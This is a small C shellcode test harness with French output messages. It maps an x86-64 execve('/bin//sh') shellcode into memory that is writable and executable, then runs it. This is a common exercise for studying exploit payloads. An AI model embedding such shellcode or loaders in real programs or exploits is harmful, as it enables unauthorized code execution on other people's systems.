#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
typedef void pf_t(void);
int main(){
       
	long pagesize = getpagesize();
	long entiershellcode = (long)code;
	printf("Addresse shellcode : %p\n",code);
	printf("Pagesize :%d\n", pagesize);
	printf("Taille shellcode :%d bytes\n", strlen(code));
	char *addr = mmap(0, sizeof(code), PROT_READ | PROT_EXEC | PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
	if (addr == MAP_FAILED){
		printf("Mapping failed");
	}
	memcpy(addr, code, sizeof(code));
	printf("Mémoire allouée à : %p", addr);
	(* ((void(*)()) addr)) ();	
	return 0;
}

